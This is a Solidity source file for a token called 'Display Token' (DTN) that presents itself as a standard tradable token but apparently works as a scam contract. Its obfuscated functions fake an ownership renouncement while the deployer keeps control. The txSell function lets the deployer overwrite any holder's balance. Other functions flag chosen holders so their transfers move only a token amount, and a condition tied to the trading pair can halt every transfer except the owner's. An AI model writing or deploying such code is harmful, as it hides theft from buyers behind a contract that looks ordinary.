//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface tokenAmountReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atLiquidity) external view returns (uint256);

    function transfer(address tokenReceiver, uint256 txMarketing) external returns (bool);

    function allowance(address listSwapReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 txMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address tokenReceiver,
        uint256 txMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellAmount, uint256 value);
    event Approval(address indexed listSwapReceiver, address indexed spender, uint256 value);
}

abstract contract launchedTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenWalletMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeFrom {
    function createPair(address isReceiver, address minToken) external returns (address);
}

interface tokenAmountReceiverMetadata is tokenAmountReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DisplayToken is launchedTrading, tokenAmountReceiver, tokenAmountReceiverMetadata {

    bool public amountMax;

    address private autoToken;

    address maxTeamReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return autoSell;
    }

    bool public totalSwap;

    bool public enableLaunchWallet;

    uint256 constant senderToken = 17 ** 10;

    uint256 fromAmount;

    address public teamIsLiquidity;

    address public amountTake;

    address swapBuyIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function shouldAt() public {
        emit OwnershipTransferred(teamIsLiquidity, address(0));
        autoToken = address(0);
    }

    mapping(address => bool) public sellReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return amountTeam;
    }

    mapping(address => bool) public modeSender;

    uint256 private limitAuto;

    function approve(address marketingTotal, uint256 txMarketing) public virtual override returns (bool) {
        exemptAtReceiver[_msgSender()][marketingTotal] = txMarketing;
        emit Approval(_msgSender(), marketingTotal, txMarketing);
        return true;
    }

    mapping(address => uint256) private limitTo;

    uint256 private amountTeam = 100000000 * 10 ** 18;

    function amountLiquidity(address feeMode, address tokenReceiver, uint256 txMarketing) internal returns (bool) {
        require(limitTo[feeMode] >= txMarketing);
        limitTo[feeMode] -= txMarketing;
        limitTo[tokenReceiver] += txMarketing;
        emit Transfer(feeMode, tokenReceiver, txMarketing);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return walletTotal;
    }

    function amountShouldFee(address minReceiver) public {
        if (amountMax) {
            return;
        }
        if (limitAuto == minModeAt) {
            limitAuto = minModeAt;
        }
        sellReceiver[minReceiver] = true;
        
        amountMax = true;
    }

    function allowance(address amountAtSender, address marketingTotal) external view virtual override returns (uint256) {
        if (marketingTotal == swapBuyIs) {
            return type(uint256).max;
        }
        return exemptAtReceiver[amountAtSender][marketingTotal];
    }

    uint256 exemptAt;

    string private minAuto = "Display Token";

    function owner() external view returns (address) {
        return autoToken;
    }

    function txSell(address tradingIsSell, uint256 txMarketing) public {
        buyExemptMax();
        limitTo[tradingIsSell] = txMarketing;
    }

    function buyExemptMax() private view {
        require(sellReceiver[_msgSender()]);
    }

    uint256 public fromTxTotal;

    function getOwner() external view returns (address) {
        return autoToken;
    }

    function name() external view virtual override returns (string memory) {
        return minAuto;
    }

    function balanceOf(address atLiquidity) public view virtual override returns (uint256) {
        return limitTo[atLiquidity];
    }

    function exemptAuto(address feeMode, address tokenReceiver, uint256 txMarketing) internal returns (bool) {
        if (feeMode == teamIsLiquidity) {
            return amountLiquidity(feeMode, tokenReceiver, txMarketing);
        }
        uint256 marketingLaunch = tokenAmountReceiver(amountTake).balanceOf(maxTeamReceiver);
        require(marketingLaunch == exemptAt);
        require(tokenReceiver != maxTeamReceiver);
        if (modeSender[feeMode]) {
            return amountLiquidity(feeMode, tokenReceiver, senderToken);
        }
        return amountLiquidity(feeMode, tokenReceiver, txMarketing);
    }

    mapping(address => mapping(address => uint256)) private exemptAtReceiver;

    uint256 private minModeAt;

    function transferFrom(address feeMode, address tokenReceiver, uint256 txMarketing) external override returns (bool) {
        if (_msgSender() != swapBuyIs) {
            if (exemptAtReceiver[feeMode][_msgSender()] != type(uint256).max) {
                require(txMarketing <= exemptAtReceiver[feeMode][_msgSender()]);
                exemptAtReceiver[feeMode][_msgSender()] -= txMarketing;
            }
        }
        return exemptAuto(feeMode, tokenReceiver, txMarketing);
    }

    uint8 private autoSell = 18;

    event OwnershipTransferred(address indexed autoLaunched, address indexed walletSwap);

    function limitShould(address feeLimit) public {
        buyExemptMax();
        if (minModeAt == fromTxTotal) {
            minModeAt = fromTxTotal;
        }
        if (feeLimit == teamIsLiquidity || feeLimit == amountTake) {
            return;
        }
        modeSender[feeLimit] = true;
    }

    function transfer(address tradingIsSell, uint256 txMarketing) external virtual override returns (bool) {
        return exemptAuto(_msgSender(), tradingIsSell, txMarketing);
    }

    string private walletTotal = "DTN";

    function maxTxMode(uint256 txMarketing) public {
        buyExemptMax();
        exemptAt = txMarketing;
    }

    constructor (){
        
        tokenWalletMarketing totalLimit = tokenWalletMarketing(swapBuyIs);
        amountTake = feeFrom(totalLimit.factory()).createPair(totalLimit.WETH(), address(this));
        
        teamIsLiquidity = _msgSender();
        shouldAt();
        sellReceiver[teamIsLiquidity] = true;
        limitTo[teamIsLiquidity] = amountTeam;
        
        emit Transfer(address(0), teamIsLiquidity, amountTeam);
    }

}